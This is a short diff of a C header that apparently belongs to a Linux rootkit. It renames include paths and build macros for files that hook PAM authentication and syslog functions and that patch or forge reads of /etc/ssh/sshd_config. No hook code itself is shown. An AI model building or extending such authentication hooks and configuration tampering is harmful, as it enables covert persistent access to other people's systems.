@@ -1,17 +1,17 @@
 #ifndef __PAM_H
 #define __PAM_H
-#include "pam/pam_private.h"
+#include "pam_private.h"
 
 int pam_authenticate(pam_handle_t *pamh, int flags);
 int pam_open_session(pam_handle_t *pamh, int flags);
 int pam_acct_mgmt(pam_handle_t *pamh, int flags);
-#include "pam/pam_hooks.c"
+#include "pam_hooks.c"
 
 void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
 void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
-#include "pam/pam_syslog.c"
+#include "pam_syslog.c"
 
-#ifdef HARD_PATCH_SSHD_CONFIG
+#ifdef SSHD_PATCH_HARD
 
 /* if the size of /etc/ssh/sshd_config's contents
  * is larger than this number, only allocate memory
@@ -30,7 +30,7 @@ void sshdpatch(void);
 
 #endif
 
-#ifdef SOFT_PATCH_SSHD_CONFIG
+#ifdef SSHD_PATCH_SOFT
 FILE *sshdforge(const char *pathname);
 #include "sshdpatch/soft.c"
 #endif
